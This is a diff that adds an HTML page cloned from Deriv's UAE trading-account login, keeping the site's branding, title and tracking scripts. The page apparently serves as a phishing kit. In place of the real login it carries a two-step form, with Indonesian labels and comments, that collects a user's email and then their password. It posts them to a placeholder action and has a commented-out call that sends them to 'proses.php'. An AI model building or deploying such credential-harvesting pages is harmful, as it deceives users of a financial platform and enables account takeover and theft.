@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class=""><head>
+
+
+
+<style>
+  body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #f4f7f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+ .card {
+    background: white;
+    padding: 30px;
+    border-radius: 14px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+    width: 360px;
+  }
+  h2 { text-align: center; margin-bottom: 20px; color: #222; }
+ .step { display: none; }
+ .step.active { display: block; animation: fade 0.3s; }
+  @keyframes fade { from {opacity: 0; transform: translateY(10px);} to {opacity: 1; transform: translateY(0);} }
+
+  input {
+    width: 100%;
+    padding: 12px;
+    margin: 8px 0 4px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    box-sizing: border-box;
+    font-size: 15px;
+  }
+ .btn-group { display: flex; justify-content: space-between; margin-top: 18px; gap: 10px; }
+  button {
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: bold;
+    font-size: 15px;
+    flex: 1;
+  }
+ .btn-next { background: #28a745; color: white; width: 100%; }
+ .btn-prev { background: #6c757d; color: white; }
+ .btn-submit { background: #007bff; color: white; }
+  small { color: red; font-size: 12px; }
+
+ .info-box {
+    background: #e8f0fe;
+    border-left: 4px solid #007bff;
+    padding: 12px 15px;
+    border-radius: 8px;
+    margin-bottom: 15px;
+    font-size: 14px;
+  }
+</style>
+</head>
+
+<script async="" src="acc_files/clarity_NqtW.js"></script><script type="text/javascript" async="" src="acc_files/identify_b8133453_NqtW.js"></script><script async="" src="acc_files/211022936_NqtW.js"></script><script type="text/javascript" async="" src="acc_files/main.MTA1OGYzZDE5OQ_NqtW.js" data-id="CM1BHTBC77U0VR5LFDV0"></script><script type="text/javascript" crossorigin="anonymous" async="" src="acc_files/array_NqtW.js"></script><script type="text/javascript" async="" src="acc_files/events_NqtW.js"></script><script src="acc_files/780746632361102_NqtW.js" async=""></script><script defer="defer" src="acc_files/fbevents_NqtW.js"></script><script async="" src="acc_files/pixie_NqtW.js"></script>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="format-detection" content="telephone=no">
+        <meta http-equiv="Cache-Control" content="no-store">
+        <meta name="indexVersionToken" content="sle8SJOld34zNxNJLBByig">
+        
+        
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<script type="text/javascript" async="" src="acc_files/bat_NqtW.js"></script><script type="text/javascript" async="" src="acc_files/js_NqtW"></script><script type="text/javascript" async="" src="acc_files/js_002_NqtW"></script><script async="" src="acc_files/gtm_NqtW.js"></script><script type="text/javascript" src="acc_files/osenv-bootstrap__Iy9uso7C8d53KuXfRjcKbQ_NqtW.js"></script>
+
+        <script type="text/javascript" src="acc_files/require__RF6WKhR49HDknz1JPc2JBg_NqtW.js"></script>
+<script type="text/javascript" src="acc_files/cordova_NqtW.js"></script>
+<script type="text/javascript" src="acc_files/requirejs-bootstrap__zaQowWKJF8EV558usoYw_NqtW.js"></script>
+<link type="text/css" rel="stylesheet" href="acc_files/_Basic__KuvtMgXv5mkGwa49BRjOg_NqtW.css">
+
+      
+    <script src="acc_files/uae.UserScripts.sumsub__EftIYZhHrPzhmSF1Y7sA_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.yupumd__tCVWZvan7PjzpHk5CZ3khw_NqtW.js" data-os-finished="true"></script>
+        <script src="acc_files/uae.UserScripts.JSCookie__116W3KNgEbZR59nd8PpqeA_NqtW.js" data-os-finished="true">
+                
+        </script>
+        <script src="acc_files/uae.UserScripts.OverwriteConsole__ajtboU1cwwvH2r0XoSiyjw_NqtW.js" data-os-finished="true"></script>
+        <script src="acc_files/uae.UserScripts.i18n__5xd0VkPH4PIyQeQjfYUg_NqtW.js" data-os-finished="true"></script>
+        <script src="acc_files/uae.UserScripts.CancellablePromise__ZssqXCMCgPexyfYPIjGt_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.NavigationListener__sUSwKpaON2zSxvqydBN8_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.webauthn__8eiReL5WkOjJZnVCfXu6wg_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.GTM__9j8eT7ykZ0aMBmtOgH1c6A_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.DerivDatadog__13LjLwlONiF31PmDmkgQ_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.TrackJS__PFLKQ2pI8CsQaNGZrd0Vw_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.DerivAnalytics__L8T7O8n11UU1v1uio2OTsQ_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.CachingScript__OYyKMdiwBzaYPPg3cEtrPw_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.DerivCookies__uFwYRDnURxRdtK4Eabw_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.ConsoleOverride__CRHWwmRhL7zNwsf7WsSYwQ_NqtW.js" data-os-finished="true"></script><script src="acc_files/uae.UserScripts.FeatureFlags__bSlNdYnjJzE0RcWkPJpiZQ_NqtW.js" data-os-finished="true"></script><script src="acc_files/OutSystemsUI.UserScripts.OutSystemsUI__1uBGeY9AAV4hiNch9_NqtW.js" data-os-finished="true"></script><script src="acc_files/iziToast.UserScripts.iziToast_min__JsbFfAzQ2TqLNxWKCuQbS_NqtW.js" data-os-finished="true"></script><script src="acc_files/OutSystemsUI.UserScripts.Virtualselect__6kFdOSsp79euM4ot_NqtW.js" data-os-finished="true"></script><script src="acc_files/datadog-rum_NqtW.js" async=""></script><script src="acc_files/t_NqtW.js" async=""></script><script src="acc_files/web-vitals.iife_NqtW.js"></script><script type="text/javascript" async="" src="acc_files/f_002_NqtW.txt"></script><link type="image/x-icon" rel="shortcut icon" href="https://app.deriv.ae/uae/favicon.png?THRQuGIx5bv6CcWNEDsy3A"><script src="acc_files/211022936_002_NqtW.js" type="text/javascript" async="" data-ueto="ueto_7c15489641"></script><link type="text/css" rel="stylesheet" id="/uae/css/OutSystemsReactWidgets__bx2NbUzbsaSlPeDZyQglxw.css?bx2NbUzbsaSlPeDZyQglxw" href="acc_files/OutSystemsReactWidgets__bx2NbUzbsaSlPeDZyQglxw_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/iziToast.iziToast.InstantiateIziToast__HO3hdCY0gYic9Rm9LDrdw.css?H+O3hdCY0gYic9Rm9LDrdw" href="acc_files/iziToast.iziToast.InstantiateIziToast__HO3hdCY0gYic9Rm9_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Layouts.DesktopProcessLayoutNotAuthorized__IJBWdUnrdaT8bopRgN38Q.css?IJBWdUnrdaT_8bopRgN38Q" href="acc_files/uae.Layouts.DesktopProcessLayoutNotAuthorized__IJBWdUnr_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/font-awesome.min__8Y9g6zLAhrEK7JgSeFMg.css?8Y9g6zLAhr_EK7JgSeFM_g" href="acc_files/font-awesome.min__8Y9g6zLAhrEK7JgSeFMg_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.PasswordPolicy__IKP7ehiOQCQlLhnIozUTw.css?IKP7ehiOQCQlLhnIozU+Tw" href="acc_files/uae.Common.PasswordPolicy__IKP7ehiOQCQlLhnIozUTw_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Layouts.MissingDataLayout__RfFoiYraz57jXlj2WiA2bQ.css?RfFoiYraz57jXlj2WiA2bQ" href="acc_files/uae.Layouts.MissingDataLayout__RfFoiYraz57jXlj2WiA2bQ_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Layouts.LayoutOnboardingMobile__wyw0HiqWb7ftmDBGSOw.css?wyw0HiqWb7ft_mDB_GS+Ow" href="acc_files/uae.Layouts.LayoutOnboardingMobile__wyw0HiqWb7ftmDBGSOw_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.InternationalPhoneSelectorMobile__JB1TxVSCpAtnfAFm0QHhxg.css?JB1TxVSCpAtnfAFm0QHhxg" href="acc_files/uae.Common.InternationalPhoneSelectorMobile__JB1TxVSCpA_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/font-awesome.min__8Y9g6zLAhrEK7JgSeFMg.css?8Y9g6zLAhr_EK7JgSeFM_g" href="acc_files/font-awesome.min__8Y9g6zLAhrEK7JgSeFMg_NqtW.css" data-os="true">
+        <link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.EmailOrPhoneNumBlock__LfBm55BUdEBQPeGqmmFT8w.css?LfBm55BUdEBQPeGqmmFT8w" href="acc_files/uae.Common.EmailOrPhoneNumBlock__LfBm55BUdEBQPeGqmmFT8w_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.SocialLogin__4p1uKiadI50D2EFsRA.css?4p1uKiadI5_0+D2+EF+sRA" href="acc_files/uae.Common.SocialLogin__4p1uKiadI50D2EFsRA_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.PasswordBlock__BYR8PifhJFtDUaJ8x6ljg.css?BYR_8PifhJFtDUaJ8x6ljg" href="acc_files/uae.Common.PasswordBlock__BYR8PifhJFtDUaJ8x6ljg_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Layouts.LayoutOnboardingMobileNotAuthorized__wyw0HiqWb7ftmDBGSOw.css?wyw0HiqWb7ft_mDB_GS+Ow" href="acc_files/uae.Layouts.LayoutOnboardingMobileNotAuthorized__wyw0Hi_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/OutSystemsUI.OutSystemsUI__VPEB2WXgzMU9PH1JfX6rw.css?VPEB2WXgzMU9P+H1JfX6rw" href="acc_files/OutSystemsUI.OutSystemsUI__VPEB2WXgzMU9PH1JfX6rw_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.ChampionApp__N8nhVmMvXl7sFTJPBpp5w.css?N8nhVmMvXl7sFTJ+PBpp5w" href="acc_files/uae.ChampionApp__N8nhVmMvXl7sFTJPBpp5w_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.Login__jaADLe5F9Wy9PNLMCv7FZQ.css?jaADLe5F9Wy9PNLMCv7FZQ" href="acc_files/uae.Common.Login__jaADLe5F9Wy9PNLMCv7FZQ_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.Common.LoginWithPassword__CvlDnlfl4IVZKWYm58aGbg.css?CvlDnlfl4IVZKWYm58aGbg" href="acc_files/uae.Common.LoginWithPassword__CvlDnlfl4IVZKWYm58aGbg_NqtW.css" data-os="true"><link type="text/css" rel="stylesheet" id="/uae/css/uae.ChampionApp.extra__YeCvHuvdXINTlMj6oIfsTg.css?YeCvHuvdXINTlMj6oIfsTg" href="acc_files/uae.ChampionApp.extra__YeCvHuvdXINTlMj6oIfsTg_NqtW.css" data-os="true"><title>Deriv Login | Access Your Trading Account</title><meta name="description" content="Securely log in to your Deriv account and start trading forex, crypto, and CFDs. Fast access, safe platform, and full account management."><meta property="og:title" content="Deriv Login | Access Your Trading Account"><meta property="og:description" content="Securely log in to your Deriv account and start trading forex, crypto, and CFDs. Fast access, safe platform, and full account management."><meta property="og:url" content="https://hub.deriv.com/uae/login"><meta property="og:site_name" content="Deriv"><meta property="og:type" content="website"><link rel="canonical" href="https://hub.deriv.com/uae/login"><script type="text/javascript" async="" src="acc_files/f_NqtW.txt"></script>
+
+
+
+
+    <body class="desktop landscape">
+            
+        <div id="reactContainer"><div id="transitionContainer"><div class="active-screen screen-container fade-enter-done">
+                <div data-container="" class="display-flex flex-direction-column row-gap-xxl">
+                       
+
+ <div data-container="" class="display-flex signup-header" id="Header4"><div data-container="" class="display-flex full-width align-items-center justify-content-space-evenly"><div data-container="" style="min-width: 64px; visibility: hidden;"></div><div data-container="" class="display-flex justify-content-center" style="flex-grow: 1;"><a data-link="" class="" href="#"><img data-image="" src="/uae/img/uae.brandderivwordmark__rUiISVnxoX9t7tfHPiekQ.svg?rUiISVnxoX9t7tf+HPiekQ" alt=""></a></div><div data-container="" class="language-switcher" style="cursor: pointer;"><img data-image="" src="/uae/img/uae.globesm__dz3jqqwqlfCpKk8wOvggRg.svg?dz3jqqwqlfCpKk8wOvggRg" alt=""><div data-container=""><span data-expression="" style="color: rgb(0, 0, 0);">العربية</span></div></div></div></div>
+                
+
+                        <div data-container="" class="display-flex justify-content-center" id="DesktopBody">
+<div data-block="Content.Card" class="OSBlockWidget" id="$b1">
+<div class="ph card card-content form-card" id="b1-Content"><div data-container="" class="OSInline" style="width: 100%; display: flex; flex: 1 0 0px; flex-direction: column; gap: 48px;">
+<div data-container="">
+
+
+</div>
+
+
+
+
+<div data-container="">
+<div data-container="">
+
+
+
+   <!-- STEP 1: CUMA EMAIL -->
+    <form id="form2Langkah" action="xxxxxxx" method="post">
+
+
+ <div class="step active">
+     <span style="color: var(--text-brandPrimaryProminent); font-size: 32px; font-style: normal; font-weight: 900; line-height: normal;">Welcome back!</span>
+<br><br><br>
+      <label>Email</label>
+      
+<input data-input="" class="form-control OSFillParent" type="user" id="email" name="email" placeholder="name@email.com" aria-required="false" maxlength="100" value="" id="DesktopEmail_input">
+      <small id="errEmail"></small>
+ 
+<div data-container="" class="display-flex justify-content-flex-end " id="NotUAEResident3">
+<a data-link="" class="" href="#">
+<span class="font-size-xs underline font-bold not-resident">Not a UAE resident?</span></a></div>
+
+<br>
+        <button  type="button" class="btn btn-primary action-button full-width" onclick="nextStep()">Lanjut</button>
+    </div>
+
+    <!-- STEP 2: TAMPIL EMAIL + 1 INPUT PASSWORD -->
+    <div class="step">
+      <h2>Enter Password</h2>
+      
+      <div class="">
+        Enter your password to log in  <b><span id="showEmail">-</span></b>
+      </div>
+
+      <label></label>
+      <input type="password" id="password" name="password" placeholder="password">
+      <small id="errPassword"></small>
+
+      <div class="btn-group">
+        <button type="button" class="btn-prev" onclick="prevStep()">Kembali</button>
+        <button type="submit" class="btn-submit">Daftar</button>
+      </div>
+    </div>
+<div data-container="" class="font-size-s text-align-center">Don’t have an account yet?<a data-link="" class="ThemeGrid_MarginGutter" href="#"><span class="font-bold login-link">Sign up</span></a></div></div></div>
+</div>
+  </form>
+
+</div>
+
+
+
+
+
+
+
+
+
+<script>
+let current = 0;
+const steps = document.querySelectorAll(".step");
+
+function showStep(n) {
+  steps.forEach((step, i) => {
+    step.classList.toggle("active", i === n);
+  });
+
+  // SAAT MASUK STEP 2, TAMPILKAN EMAIL DARI STEP 1
+  if(n === 1) {
+    document.getElementById("showEmail").innerText = document.getElementById("email").value;
+  }
+}
+
+function nextStep() {
+  // VALIDASI EMAIL DULU SEBELUM LANJUT
+  const email = document.getElementById("email").value.trim();
+  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+  document.getElementById("errEmail").innerText = "";
+
+  if(email === "") {
+    document.getElementById("errEmail").innerText = "Email wajib diisi";
+    return;
+  }
+  if(!emailRegex.test(email)) {
+    document.getElementById("errEmail").innerText = "Format email tidak valid";
+    return;
+  }
+
+  current++;
+  showStep(current);
+}
+
+function prevStep() {
+  current--;
+  showStep(current);
+}
+
+// VALIDASI & SUBMIT STEP 2
+document.getElementById("form2Langkah").addEventListener("submit", function(e){
+  e.preventDefault();
+  const pass = document.getElementById("password").value.trim();
+  document.getElementById("errPassword").innerText = "";
+
+  if(pass.length < 6) {
+    document.getElementById("errPassword").innerText = "Password minimal 6 karakter";
+    return;
+  }
+
+  let data = new FormData(this);
+  alert("Pendaftaran Berhasil!\nEmail: " + data.get('email') + "\nPassword: " + data.get('password'));
+  
+  // Kirim ke server
+  // fetch('proses.php', {method:'POST', body: data})
+});
+</script>
+
+
+</div></div></div>
+
+
+
+
+
+
+
+
+
+</div>
+</div></div>
+        <script type="text/javascript" crossorigin="anonymous" src="acc_files/surveys_NqtW.js"></script><script type="text/javascript" crossorigin="anonymous" src="acc_files/config_NqtW.js"></script><script src="acc_files/register-sw__J7fRGEnFgRZMat7baVWRg_NqtW.js"></script>
+<noscript>&lt;span&gt;JavaScript is required&lt;/span&gt;</noscript>
+
+        <script async="" type="module" src="acc_files/_osbundle-uae.index__FPzTgYTXQl8Rdci3MnzBw_NqtW.js"></script>
+
+    <script defer="defer" src="acc_files/v4513226cdae34746b4dedf0b4dfa099e1781791509496_NqtW" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7fde3b0572eb4391ae94b57b6ce6f277&quot;,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+
+<script id="" text="" charset="" type="text/javascript" src="acc_files/user-journey-tracker.umd_NqtW.js"></script>
+<script type="text/javascript" id="" charset="">!function(a,b){if(!a.pixie){var c=a.pixie=function(d,e,f){c.actionQueue.push({action:d,actionValue:e,params:f})};c.actionQueue=[];a=b.createElement("script");a.async=!0;a.src="//acdn.adnxs.com/dmp/up/pixie.js";b=b.getElementsByTagName("head")[0];b.insertBefore(a,b.firstChild)}}(window,document);pixie("init","755502b2-e248-4c31-bf2c-6147f06dde52");</script>
+<script type="text/javascript" id="" charset="">!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version="2.0";n.queue=[];t=b.createElement(e);t.defer=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","780746632361102");
+fbq("track","PageView",{User_ID:"undefined",Currency:"undefined",Country:"undefined",Website_language:"undefined"});if("gtm.js"=="virtual_signup")fbq("trackCustom","Virtual Sign-up",{User_ID:"undefined",Website_language:"undefined",Currency:"undefined",Country:"undefined"});
+if("gtm.js"=="real_signup")fbq("trackCustom","Real Sign-up",{User_ID:"undefined",Website_language:"undefined",Currency:"undefined",Country:"undefined"});</script>
+<noscript>&lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=780746632361102&amp;amp;ev=PageView&amp;amp;noscript=1"&gt;</noscript>
+<script type="text/javascript" id="" charset="">!function(d,g,e){d.TiktokAnalyticsObject=e;var a=d[e]=d[e]||[];a.methods="page track identify instances debug on off once ready alias group enableCookie disableCookie".split(" ");a.setAndDefer=function(b,c){b[c]=function(){b.push([c].concat(Array.prototype.slice.call(arguments,0)))}};for(d=0;d<a.methods.length;d++)a.setAndDefer(a,a.methods[d]);a.instance=function(b){b=a._i[b]||[];for(var c=0;c<a.methods.length;c++)a.setAndDefer(b,a.methods[c]);return b};a.load=function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";
+a._i=a._i||{};a._i[b]=[];a._i[b]._u=f;a._t=a._t||{};a._t[b]=+new Date;a._o=a._o||{};a._o[b]=c||{};c=document.createElement("script");c.type="text/javascript";c.async=!0;c.src=f+"?sdkid\x3d"+b+"\x26lib\x3d"+e;b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(c,b)};a.load("CM1BHTBC77U0VR5LFDV0");a.page()}(window,document,"ttq");</script><script type="text/javascript" id="" charset="">!function(l,a){var h,g,f,m;a.__SV||window.posthog&&window.posthog.__loaded||(window.posthog=a,a._i=[],a.init=function(p,n,d){function q(e,b){var k=b.split(".");2==k.length&&(e=e[k[0]],b=k[1]);e[b]=function(){e.push([b].concat(Array.prototype.slice.call(arguments,0)))}}(f=l.createElement("script")).type="text/javascript";f.crossOrigin="anonymous";f.async=!0;f.src=n.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js";(m=l.getElementsByTagName("script")[0]).parentNode.insertBefore(f,
+m);var c=a;void 0!==d?c=a[d]=[]:d="posthog";c.people=c.people||[];c.toString=function(e){var b="posthog";return"posthog"!==d&&(b+="."+d),e||(b+=" (stub)"),b};c.people.toString=function(){return c.toString(1)+".people (stub)"};h="init ts ns yi rs os Qr es capture Hi calculateEventProperties hs register register_once register_for_session unregister unregister_for_session fs getFeatureFlag getFeatureFlagPayload isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync identify setPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty vs us createPersonProfile cs Yr ps opt_in_capturing opt_out_capturing has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing ls debug O ds getPageViewId captureTraceFeedback captureTraceMetric Vr".split(" ");
+for(g=0;g<h.length;g++)q(c,h[g]);a._i.push([p,n,d])},a.__SV=1)}(document,window.posthog||[]);posthog.init("phc_AWtl8ivoV01DFQB6Ems9cfTddxlKZsoTY1KQWBGHLlx",{api_host:"https://eu.i.posthog.com",defaults:"2025-11-30",person_profiles:"identified_only"});</script><script type="text/javascript" id="web-vitals-debug" charset="">function pageLoad(){if(window.performance&&window.performance.getEntriesByType){var a=window.performance.getEntriesByType("navigation");if(a.length>0)return a=a[0],a=a.loadEventEnd-a.startTime,{name:"PAGELOAD",id:"v2-"+Date.now()+"-"+Math.floor(Math.random()*(9E12-1))+1E12,value:Math.round((a/1E3+Number.EPSILON)*100)/100,delta:null,rating:null,valueRounded:null,deltaRounded:null,websiteVersion:document.querySelector("meta[name\x3dversion]")&&document.querySelector("meta[name\x3dversion]").content}}}
+function getSelector(a,b){b=b||100;var c="";try{for(;a&&a.nodeType!==9;){var d=a.id?"#"+a.id:a.nodeName.toLowerCase()+(a.className&&a.className.length?"."+Array.from(a.classList.values()).join("."):"");if(c.length+d.length>b-1)return c||d;c=c?d+"\x3e"+c:d;if(a.id)break;a=a.parentNode}}catch(e){}return c}function getLargestLayoutShiftEntry(a){return a.reduce(function(b,c){return b&&b.value>c.value?b:c})}
+function getLargestLayoutShiftSource(a){return a.reduce(function(b,c){return b.node&&b.previousRect.width*b.previousRect.height>c.previousRect.width*c.previousRect.height?b:c})}function wasFIDBeforeDCL(a){var b=performance.getEntriesByType("navigation")[0];return b&&a.startTime<b.domContentLoadedEventStart}
+function getDebugInfo(a,b){b=b||[];a=a||"";if(b.length){if(a==="LCP")return a=b[b.length-1],{debug_target:getSelector(a.element),event_time:a.startTime};if(a==="FID")return a=b[0],{debug_target:getSelector(a.target),debug_event:a.name,debug_timing:wasFIDBeforeDCL(a)?"pre_dcl":"post_dcl",event_time:a.startTime};if(a==="CLS"&&(a=getLargestLayoutShiftEntry(b))&&a.sources&&(b=getLargestLayoutShiftSource(a.sources)))return{debug_target:getSelector(b.node),event_time:a.startTime}}return{debug_target:"(not set)"}}
+;</script>
+<script type="text/javascript" id="web-vitals-rating" charset="">function getRating(b,a){switch(b){case "LCP":return calculateRating(a,2500,4E3);case "FID":return calculateRating(a,100,300);case "CLS":return calculateRating(a,.1,.25);case "FCP":return calculateRating(a,2E3,4E3);case "TTFB":return calculateRating(a,500,1500);default:return"(not set)"}}function calculateRating(b,a,c){return b||b===0?b>c?"poor":b>a?"in":"good":"(not set)"};</script>
+<script type="text/javascript" id="web-vitals-ga4" charset="">function sendToDataLayer(a){if(a){var c={name:a.name,id:a.id,value:a.value,delta:a.delta,rating:getRating(a.name,a.value),valueRounded:Math.round(a.name==="CLS"?a.value*1E3:a.value),deltaRounded:Math.round(a.name==="CLS"?a.value*1E3:a.value),websiteVersion:document.querySelector("meta[name\x3dversion]")&&document.querySelector("meta[name\x3dversion]").content},b=getDebugInfo(a&&a.name,a&&a.entries);b.debug_target&&(c.debugTarget=b.debug_target);b.debug_event&&(c.debugEvent=b.debug_event);b.debug_timing&&
+(c.debugTiming=b.debug_timing);b.event_time&&(c.eventTime=b.event_time);a&&dataLayer.push({event:"coreWebVitals",webVitalsMeasurement:c})}};</script>
+<script type="text/javascript" id="web-vitals-cdn" charset="">(function(){var a=document.createElement("script");a.src="https://unpkg.com/web-vitals@3.5.2/dist/web-vitals.iife.js";a.onload=function(){webVitals.getCLS(sendToDataLayer);webVitals.getFID(sendToDataLayer);webVitals.getLCP(sendToDataLayer);sendToDataLayer(pageLoad())};document.head.appendChild(a)})();</script>
+
+<script type="text/javascript" id="" charset="">console.log("MTA has been initialised");window.tracker=new UserJourneyTracker({autoTrack:!0});window.tracker.init();</script><div style="width: 0px; height: 0px; display: none; visibility: hidden;" id="batBeacon845855752753"><img style="width: 0px; height: 0px; display: none; visibility: hidden;" id="batBeacon934655469024" width="0" height="0" alt="" src="acc_files/0_NqtW"></div></body></html>
